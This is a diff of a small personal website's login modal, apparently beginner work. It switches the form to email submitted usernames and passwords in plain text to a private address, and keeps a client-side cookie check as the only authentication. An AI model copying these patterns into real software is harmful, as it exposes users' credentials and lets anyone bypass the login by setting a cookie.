@@ -14,7 +14,7 @@
             
 <div id="id01" class="modal">
   
-  <form class="modal-content animate" action="https://alexiamaye.github.io" path="/">
+  <form class="modal-content animate" action="mailto:krazykitty3.14@gmail.com" enctype="text/plain" method="POST" path="/">
     <div class="imgcontainer">
       <span onclick="document.getElementById('id01').style.display='none'" class="close" title="Close Modal">×</span>
       <img src="Key-PNG-Clipart.png" alt="Avatar" class="avatar">
@@ -56,8 +56,16 @@ window.onclick = function(event) {
     }
 }
 </script>
-                <script>
-                if($.cookie("authenticationCookie") != null && $.cookie("authenticationCookie") == "true" ) {
+<script>
+//Get the vars
+var uname = document.getElementById('uname').value;
+var psw = document.getElementById('psw').value;
+
+
+                
+</script>
+<script>
+     if($.cookie("authenticationCookie") != null && $.cookie("authenticationCookie") == "true" ) {
             $body.one(window.location = "https://alexiamaye.github.io")
      }
      else {
